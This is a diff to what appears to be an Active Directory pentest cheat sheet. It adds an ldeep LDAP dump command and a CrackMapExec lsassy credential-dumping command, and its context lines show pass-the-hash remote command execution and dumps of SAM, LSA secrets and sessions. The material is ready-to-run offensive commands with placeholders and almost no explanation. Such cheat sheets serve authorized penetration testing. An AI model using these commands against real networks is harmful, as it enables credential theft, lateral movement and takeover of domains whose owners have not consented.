@@ -120,6 +120,9 @@ python3 -m ade --dc <domain.name> -u <user@domain.name> --help
 windapsearch -d <domain>.<name> -u <user> -p <password> --help
 
 # LDAP
+# best tool : ldeep - https://github.com/franc-pentest/ldeep
+ldeep ldap -u <USER> -p <PASSWORD> -d <DOMAIN> -s ldap://<DC_IP_OR_LDAP_SERV> all ldap_dump_
+
 # Domain users
 ldapsearch -LLL -x -H ldap://<DC.IP> -D "<USER>@<DOMAIN.NAME>" -w '<PASSWORD>' -b dc=<DOMAIN NAME>,dc=<DOMAIN NAME> -o ldif-wrap=no "(&(objectClass=user)(objectCategory=person))" name sAMAccountName userPrincipalName memberOf primaryGroupID adminCount userAccountControl description servicePrincipalName objectSid pwdLastSet lastLogon -E pr=1000/noprompt | tee domain_users.txt
 
@@ -148,10 +151,11 @@ cme smb <IP> -u <USER> -H <NTHASH> -x whoami
 cme smb <IP> -u <USER> -p '<PASS>' --exec-method {mmcexec,smbexec,atexec,wmiexec}
 
 # Dumps
-
+# LSASSY
+cme smb <IP> -d <DOMAIN> -u <USER> -p <PASS> -M lsassy
 # SAM
 cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --sam
-# LSASS
+# LSA
 cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --lsa
 # Sessions
 cme smb <IP> -d <DOMAIN> -u <USER> -p '<PASS>' --sessions
